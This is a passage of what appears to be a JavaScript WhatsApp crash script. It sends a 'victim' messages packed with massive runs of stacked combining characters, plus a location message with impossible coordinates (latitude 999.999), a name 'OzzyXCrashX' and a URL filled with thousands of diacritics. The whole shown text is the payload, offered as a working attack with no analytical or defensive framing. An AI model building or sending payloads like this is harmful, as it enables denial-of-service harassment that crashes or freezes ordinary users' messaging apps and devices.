̤̲͎̠̣ᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅ`
      commet: xiphone,
      jpegThumbnail: null
    }
  }, { quoted: xbug })
  await xartva.sendMessage(victim, {
    location: {
      degreesLatitude: 999.999,
      degreesLongitude: -99.888,
      name: "O̷̡̡̙̰̩̳̱̍̊̀͌̕͠z̷̡̧̯͕͍͈̼̪̦̞͎̜̘͕̭̄͛̋̽͒̉͜ͅz̴̛͓͓̪̩̮̓͐̂̏́́̕͘͝ÿ̸̧̛͎͓̠̗̩̖͉͍͚͙̬̃̿͒͂̈́̇̄͑̀͂͆͘̚͜ͅͅX̴͎̦̰͎̙̳̯̯̝̳̰̱͖̜̳̔̿͋̐̈́̎̂̓̔͜͜͝C̵̡̢̺͚̭̯̱̤̭̣͎̦̦̙͌̀͆ͅř̷͙̓͆̽̊̈́̎̓̈́͑͑̂̒̕̚͝ā̵̧̝͇͍͖̠̬̱̦̦̯̦̥̘̀̾̀̆̄̿̓̃͛̈́͠͠ͅś̶̲̠͔̥͔̥͇͎̋̽̚ͅḧ̸̠̪̱́̅̍̓̾͠Ẍ̶̧̡̛̺̘͎͕̯̺̥͎́̃̉͋̿̀̌̀̓̄̑͗̏͝x̷͕̱̦̖͔͌̄̾͋̈́̓̚͘",
      address: "☠️",
      url: `https://̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠S̸̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̚͠͝͝